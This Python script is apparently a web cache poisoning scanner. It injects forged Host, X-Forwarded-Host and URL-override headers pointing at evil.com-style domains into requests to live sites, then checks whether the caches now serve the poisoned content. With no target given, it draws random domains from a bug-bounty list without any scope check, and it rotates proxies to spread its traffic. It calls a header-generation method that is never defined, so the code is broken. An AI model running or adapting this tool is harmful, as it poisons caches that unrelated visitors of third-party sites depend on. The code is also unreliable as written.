#!/usr/bin/env python3
import argparse
import requests
import time
import json
import sys
import random
import subprocess
import urllib3
import re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
import logging
from typing import List, Dict, Optional, Set, Tuple
from requests.exceptions import RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CachePoisonDetector:
    def __init__(self, target_url: str = None, threads: int = 10, timeout: int = 10, proxy_list_url: str = None):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.results = []
        self.proxy_list = []
        self.request_delay = 1.5
        self.max_requests_per_minute = 30
        self.last_request_time = 0
        self.cache_indicators = set()
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        # Load proxy list
        if proxy_list_url:
            try:
                response = requests.get(proxy_list_url)
                self.proxy_list = [{'http': f'http://{proxy.strip()}'} for proxy in response.text.split('\n') if proxy.strip()]
            except Exception as e:
                logging.error(f"Failed to load proxy list: {e}")

        # Initialize payload generators
        self.init_payloads()
        
        # If no target provided, get random targets from bounty-targets
        if not self.target_url:
            self.targets = self.get_random_targets()
        else:
            self.targets = [self.target_url]

        # Get and filter suitable targets
        self.all_targets = self.get_suitable_targets()

    def init_payloads(self):
        """Initialize various payload combinations"""
        self.base_domains = [
            'evil.com',
            'attacker.com',
            'cache.evil.com',
            'poison.evil.com',
            'internal.evil.com'
        ]
        
        self.path_payloads = [
            '/admin',
            '/internal',
            '/api',
            '/.env',
            '/config',
            '/dashboard'
        ]
        
        self.test_headers = {
            # Host header variations
            'Host': self.base_domains,
            'X-Forwarded-Host': self.base_domains,
            'X-Host': self.base_domains,
            'X-Forwarded-Server': self.base_domains,
            'X-HTTP-Host-Override': self.base_domains,
            'X-Original-Host': self.base_domains,
            'X-Backend-Host': self.base_domains,
            
            # Scheme/Protocol variations
            'X-Forwarded-Proto': ['http', 'https', 'ws', 'wss'],
            'X-Forwarded-Scheme': ['http', 'https', 'ws', 'wss'],
            'X-URL-Scheme': ['http', 'https'],
            
            # Path override attempts
            'X-Original-URL': self.path_payloads,
            'X-Rewrite-URL': self.path_payloads,
            'X-Override-URL': self.path_payloads,
            
            # Cache control attempts
            'X-Cache-Key': self.base_domains,
            'X-Cache-Hash': self.base_domains,
            'X-Cache-Vary': ['accept-encoding,host,x-forwarded-host'],
            
            # CDN-specific headers
            'CF-Connecting-IP': ['127.0.0.1', '192.168.0.1'],
            'Fastly-SSL': ['1'],
            'Akamai-Origin-Hop': ['1'],
            'CDN-Loop': ['cloudflare'],
            
            # Other potential vectors
            'X-Frame-Options': ['ALLOW-FROM evil.com'],
            'Content-Security-Policy': ['connect-src evil.com'],
            'Access-Control-Allow-Origin': self.base_domains
        }

    def is_cacheable_response(self, response: requests.Response) -> bool:
        """Enhanced cache detection"""
        cache_indicators = {
            # Standard cache headers
            'Cache-Control': lambda x: any(d in x.lower() for d in ['public', 'max-age', 's-maxage']),
            'X-Cache': lambda x: True,
            'X-Cache-Hit': lambda x: True,
            'Age': lambda x: int(x) > 0 if x.isdigit() else False,
            
            # CDN-specific headers
            'CF-Cache-Status': lambda x: x.upper() != 'BYPASS',
            'X-Varnish': lambda x: True,
            'X-Drupal-Cache': lambda x: True,
            'X-Fastly-Cache': lambda x: True,
            'Fastly-Debug-Digest': lambda x: True,
            'X-Cache-Hits': lambda x: int(x) > 0 if x.isdigit() else False,
            'X-CDN': lambda x: True,
            
            # Azure/AWS/GCP indicators
            'X-Azure-Ref': lambda x: True,
            'X-Served-By': lambda x: True,
            'X-Cache-Key': lambda x: True
        }

        for header, validator in cache_indicators.items():
            if header in response.headers:
                try:
                    if validator(response.headers[header]):
                        self.cache_indicators.add(header)
                        return True
                except Exception:
                    continue

        return False

    def analyze_cacheability(self, url: str) -> Tuple[bool, Dict]:
        """Analyze if a target is suitable for cache poisoning"""
        try:
            # Make initial request
            resp1 = self.make_request(url)
            if not resp1:
                return False, {}

            # Check for cache indicators
            is_cacheable = self.is_cacheable_response(resp1)
            if not is_cacheable:
                return False, {}

            # Make second request to verify caching behavior
            time.sleep(2)
            resp2 = self.make_request(url)
            if not resp2:
                return False, {}

            # Analyze cache behavior
            cache_info = {
                'cache_headers': list(self.cache_indicators),
                'cache_time': int(resp1.headers.get('Age', 0)),
                'varies_header': resp1.headers.get('Vary', ''),
                'cache_control': resp1.headers.get('Cache-Control', ''),
                'server': resp1.headers.get('Server', ''),
                'cdn_info': self.detect_cdn(resp1)
            }

            return True, cache_info

        except Exception as e:
            self.logger.error(f"Error analyzing cacheability for {url}: {e}")
            return False, {}

    def detect_cdn(self, response: requests.Response) -> str:
        """Detect CDN from response headers"""
        cdn_indicators = {
            'Cloudflare': ['cf-ray', 'cf-cache-status'],
            'Akamai': ['x-akamai-transformed'],
            'Fastly': ['fastly-debug-digest', 'x-served-by'],
            'Varnish': ['x-varnish'],
            'CloudFront': ['x-amz-cf-id'],
            'Azure CDN': ['x-azure-ref'],
            'Google Cloud CDN': ['x-goog-cache']
        }

        for cdn, headers in cdn_indicators.items():
            if any(h in response.headers for h in headers):
                return cdn
        return 'Unknown'

    def get_suitable_targets(self) -> List[str]:
        """Get and filter suitable targets for cache poisoning"""
        all_targets = []
        
        # First, enumerate subdomains
        raw_targets = self.enumerate_subdomains()
        
        self.logger.info(f"Analyzing {len(raw_targets)} potential targets for cacheability...")
        
        for target in raw_targets:
            try:
                # Try HTTPS first
                url = f"https://{target}"
                is_cacheable, cache_info = self.analyze_cacheability(url)
                
                if not is_cacheable:
                    # Try HTTP if HTTPS fails
                    url = f"http://{target}"
                    is_cacheable, cache_info = self.analyze_cacheability(url)
                
                if is_cacheable:
                    self.logger.info(f"Found suitable target: {url}")
                    self.logger.debug(f"Cache info: {json.dumps(cache_info, indent=2)}")
                    all_targets.append({
                        'url': url,
                        'cache_info': cache_info
                    })
            
            except Exception as e:
                self.logger.error(f"Error analyzing target {target}: {e}")
                continue
        
        # Sort targets by potential vulnerability (more cache headers = more interesting)
        sorted_targets = sorted(
            all_targets,
            key=lambda x: len(x['cache_info']['cache_headers']),
            reverse=True
        )
        
        return [t['url'] for t in sorted_targets]

    def get_random_targets(self, num_targets: int = 3) -> List[str]:
        """Get random targets from bounty-targets-data"""
        try:
            response = requests.get('https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt')
            all_targets = [t.strip().replace('*.', '') for t in response.text.split('\n') if t.strip()]
            
            # Filter out invalid targets and select random ones
            valid_targets = [t for t in all_targets if not t.startswith('*') and '.' in t]
            return random.sample(valid_targets, min(num_targets, len(valid_targets)))
            
        except Exception as e:
            self.logger.error(f"Failed to get random targets: {e}")
            return []

    def enumerate_subdomains(self) -> List[str]:
        """Enumerate subdomains using subfinder"""
        all_subdomains = []
        
        for target in self.targets:
            try:
                # Run subfinder
                self.logger.info(f"Enumerating subdomains for {target}")
                result = subprocess.run(
                    ['subfinder', '-d', target, '-silent', '-recursive'],
                    capture_output=True,
                    text=True
                )
                
                # Process subfinder output
                subdomains = [
                    sub.strip() 
                    for sub in result.stdout.split('\n') 
                    if sub.strip()
                ]
                
                self.logger.info(f"Found {len(subdomains)} subdomains for {target}")
                all_subdomains.extend(subdomains)
                
            except Exception as e:
                self.logger.error(f"Subfinder failed for {target}: {e}")
                
        return all_subdomains if all_subdomains else self.targets

    def apply_rate_limiting(self):
        """Implement rate limiting between requests"""
        current_time = time.time()
        time_since_last_request = current_time - self.last_request_time
        
        if time_since_last_request < (60 / self.max_requests_per_minute):
            sleep_time = (60 / self.max_requests_per_minute) - time_since_last_request
            time.sleep(sleep_time)
        
        self.last_request_time = time.time()

    def get_random_proxy(self):
        """Get a random proxy from the proxy list"""
        return random.choice(self.proxy_list) if self.proxy_list else None

    def make_request(self, url: str, headers: Dict = None) -> Optional[requests.Response]:
        """Make a request with rate limiting and proxy rotation"""
        self.apply_rate_limiting()
        
        try:
            proxy = self.get_random_proxy()
            return requests.get(
                url,
                headers=headers,
                proxies=proxy,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
        except Exception as e:
            self.logger.debug(f"Request failed: {str(e)}")
            return None

    def check_response_similarity(self, resp1: requests.Response, resp2: requests.Response) -> float:
        """Check how similar two responses are"""
        if not resp1 or not resp2:
            return 0.0
            
        # Compare status codes
        if resp1.status_code != resp2.status_code:
            return 0.5
            
        # Compare response lengths
        len1 = len(resp1.text)
        len2 = len(resp2.text)
        if abs(len1 - len2) > (max(len1, len2) * 0.1):  # 10% threshold
            return 0.7
            
        # Compare headers
        common_headers = set(resp1.headers.keys()) & set(resp2.headers.keys())
        header_diff = sum(resp1.headers[h] != resp2.headers[h] for h in common_headers)
        if header_diff > 0:
            return 0.8
            
        return 1.0

    def test_header_combination(self, headers: Dict[str, str]) -> Optional[Dict]:
        """Enhanced cache poisoning detection"""
        try:
            # Make control request
            control_resp = self.make_request(self.target_url)
            if not control_resp or not self.is_cacheable_response(control_resp):
                return None

            # Test with poisoned headers
            poison_resp = self.make_request(self.target_url, headers)
            if not poison_resp:
                return None

            # Multiple verification requests to confirm caching
            time.sleep(random.uniform(2.0, 3.0))
            verify_resps = []
            for _ in range(3):
                verify_resp = self.make_request(self.target_url)
                if verify_resp:
                    verify_resps.append(verify_resp)
                time.sleep(1)

            if not verify_resps:
                return None

            # Analyze responses for cache poisoning indicators
            evidence = self.analyze_poison_evidence(
                control_resp,
                poison_resp,
                verify_resps,
                headers
            )

            if evidence['is_vulnerable']:
                return {
                    'url': self.target_url,
                    'vulnerable_headers': headers,
                    'evidence': evidence,
                    'cache_info': {
                        'headers': dict(poison_resp.headers),
                        'status_codes': [r.status_code for r in verify_resps],
                        'cache_keys': list(self.cache_indicators)
                    }
                }

        except Exception as e:
            self.logger.error(f"Error testing headers {headers}: {str(e)}")
            
        return None

    def analyze_poison_evidence(
        self,
        control_resp: requests.Response,
        poison_resp: requests.Response,
        verify_resps: List[requests.Response],
        test_headers: Dict[str, str]
    ) -> Dict:
        """Analyze evidence of successful cache poisoning"""
        evidence = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'indicators': []
        }

        # Check status code variations
        status_codes = [r.status_code for r in verify_resps]
        if any(sc != control_resp.status_code for sc in status_codes):
            evidence['indicators'].append('status_code_mismatch')
            evidence['confidence'] += 0.3

        # Check for poisoned content in responses
        for resp in verify_resps:
            for payload in test_headers.values():
                if isinstance(payload, str) and payload in resp.text:
                    evidence['indicators'].append('payload_reflected')
                    evidence['confidence'] += 0.4
                    break

        # Check header poisoning
        for resp in verify_resps:
            for header, value in test_headers.items():
                if header in resp.headers and value in resp.headers[header]:
                    evidence['indicators'].append('header_poisoned')
                    evidence['confidence'] += 0.4

        # Check response size variations
        control_size = len(control_resp.content)
        poison_sizes = [len(r.content) for r in verify_resps]
        if any(abs(ps - control_size) > control_size * 0.1 for ps in poison_sizes):
            evidence['indicators'].append('size_variation')
            evidence['confidence'] += 0.2

        # Final vulnerability determination
        evidence['is_vulnerable'] = evidence['confidence'] >= 0.7
        
        return evidence

    def scan(self) -> List[Dict]:
        """Main scanning function"""
        self.logger.info(f"Starting cache poison scan for {self.target_url}")
        
        header_combinations = self.generate_header_combinations()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            results = list(filter(None, executor.map(
                self.test_header_combination,
                header_combinations
            )))
            
        self.logger.info(f"Scan completed. Found {len(results)} potential vulnerabilities.")
        return results

    def scan_all(self) -> List[Dict]:
        """Scan all targets and their subdomains"""
        all_results = []
        
        for target in self.all_targets:
            try:
                self.logger.info(f"🎯 Starting scan for target: {target}")
                self.target_url = target
                
                # Try HTTPS first
                try:
                    self.logger.info("Testing HTTPS...")
                    test_response = requests.get(self.target_url, timeout=5, verify=False)
                except:
                    # If HTTPS fails, try HTTP
                    self.logger.info("HTTPS failed, trying HTTP...")
                    self.target_url = target.replace('https://', 'http://')
                
                self.logger.info("Analyzing cache behavior...")
                is_cacheable, cache_info = self.analyze_cacheability(self.target_url)
                
                if is_cacheable:
                    self.logger.info(f"✅ Target is cacheable! Found indicators: {', '.join(cache_info['cache_headers'])}")
                    self.logger.info(f"CDN detected: {cache_info['cdn_info']}")
                    
                    self.logger.info("Testing for cache poisoning vulnerabilities...")
                    results = self.scan()
                    
                    if results:
                        self.logger.info(f"🚨 Found {len(results)} potential vulnerabilities!")
                        for result in results:
                            self.logger.info(f"""
                            Vulnerability Details:
                            - URL: {result['url']}
                            - Vulnerable Headers: {json.dumps(result['vulnerable_headers'], indent=2)}
                            - Confidence: {result['evidence']['confidence']}
                            - Indicators: {', '.join(result['evidence']['indicators'])}
                            """)
                        all_results.extend(results)
                    else:
                        self.logger.info("No vulnerabilities found in this target")
                else:
                    self.logger.info("❌ Target is not cacheable, skipping...")
                    
            except Exception as e:
                self.logger.error(f"Failed to scan {target}: {e}")
                continue
                
        return all_results

def main():
    parser = argparse.ArgumentParser(description='Web Cache Poison Detector')
    parser.add_argument('-u', '--url', help='Target URL (optional, will use random targets if not specified)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--proxy-list', help='Proxy list URL or file path')
    
    args = parser.parse_args()
    
    # Set logging level based on verbose flag
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    detector = CachePoisonDetector(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        proxy_list_url=args.proxy_list
    )
    
    print("\n🔍 Starting Cache Poison Detection Scan\n")
    results = detector.scan_all()
    
    if results:
        print("\n🚨 Potential cache poisoning vulnerabilities found!")
        print(f"Total vulnerabilities: {len(results)}")
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n✅ Results saved to {args.output}")
        
        # Print summary of findings
        print("\n📊 Summary of Findings:")
        for idx, result in enumerate(results, 1):
            print(f"""
            Finding #{idx}:
            - URL: {result['url']}
            - Vulnerable Headers: {json.dumps(result['vulnerable_headers'], indent=2)}
            - Confidence: {result['evidence']['confidence']}
            - Indicators: {', '.join(result['evidence']['indicators'])}
            """)
        
        sys.exit(1)
    else:
        print("\n✅ No cache poisoning vulnerabilities detected")
        sys.exit(0)

if __name__ == "__main__":
    main() 
